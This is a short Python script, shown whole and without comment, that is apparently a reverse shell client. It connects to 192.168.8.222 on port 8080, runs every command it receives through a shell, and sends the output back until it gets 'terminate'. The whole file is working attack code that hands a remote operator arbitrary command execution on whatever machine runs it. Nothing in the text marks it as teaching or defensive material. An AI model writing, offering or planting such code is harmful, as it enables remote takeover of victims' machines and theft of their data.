import socket
import subprocess

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.8.222", 8080))
    
    while True:
        command = s.recv(1024).decode("utf-8")
        if 'terminate' in command:
            s.close()
            break
        else:
            cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = output_bytes.decode("utf-8")
            s.send(output_str.encode("utf-8") + b'\n')
    s.close()

def main():
    connect()

if __name__ == "__main__":
    main()